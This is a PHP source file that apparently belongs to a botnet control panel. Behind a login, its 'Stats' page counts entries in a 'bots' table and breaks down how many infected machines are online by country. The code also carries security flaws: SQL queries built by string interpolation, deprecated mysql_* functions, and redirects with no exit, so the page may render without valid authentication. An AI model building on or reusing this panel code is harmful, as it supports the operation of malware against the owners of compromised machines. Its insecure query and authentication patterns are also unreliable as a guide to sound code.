<?php
	include_once('config.php');
	
	if(isset($_POST['login']))
	{
		$username = $_POST['user'];
		$pass = $_POST['pass'];
					
		if(!$auth->authenticate($username, $pass)){
			echo "<script type='text/javascript'>alert('Username or Password incorrect!');</script>";
		}
		
		if (!$auth->verify()){
			header( 'Location: index.php' ) ;
		}
	}
?>

<?php
if($_GET['page'] == "logout")
{	
	session_start();
	session_unset();
	session_destroy();
	header( 'Location: index.php' ) ;
}
?>


<html>
<head>
	<title>Stats</title>

	<link rel="stylesheet" href="css/skeleton-v1.1.css">
	<link rel="stylesheet" href="css/main-r6.css">
</head>

<body>

<div id="main" role="main" class="dark">

<header class="dark">
	<div class="container">
		<h1 class="logo one-third column alpha">
			<a href="">
				<img src="images/logo-white.png" alt="Spark" class="scale-with-grid" />
			</a>
		</h1>

		<nav class="menu two-thirds column omega">
			<ul>
				<li><a href="index.php">Main</a></li>
				<li><a href="" class="active">Stats</a></li>
				<li><a href="index.php?page=logout">Log Out</a></li>
			</ul>
		</nav>
	</div><!-- .container -->

	<div class="bottom-gradient">
		<span class="left"></span>
		<span class="center"></span>
		<span class="right"></span>
	</div>	
</header>

<article id="home">
	<div class="container">
		<div class="row box dark light">
			<div class="row">
			<center>
			<h1>Stats</h1>
			<?php
			$result = mysql_query("SELECT * FROM bots");
			$num_rows = mysql_num_rows($result);
			echo "<h3> $num_rows Online </h3>";
			echo "--------------------------</br>";
$result2 = mysql_query("SELECT DISTINCT country FROM bots");
while($row = mysql_fetch_array($result2))
  {
  echo "<tr>";
  echo "<td>" . $row['country'] . "</td>";
  $a = $row['country'];
  $result3 = mysql_query("SELECT * FROM bots WHERE country='$a'");
  echo "<td>&nbsp;&nbsp;&nbsp;&nbsp;". mysql_num_rows($result3) ."</td>";
  echo "</tr></br>";
  }
echo "</table>";
			
			?>
			</div>
		</div><!-- .row -->	
	</div><!-- .container -->
</article>
</body>
</html>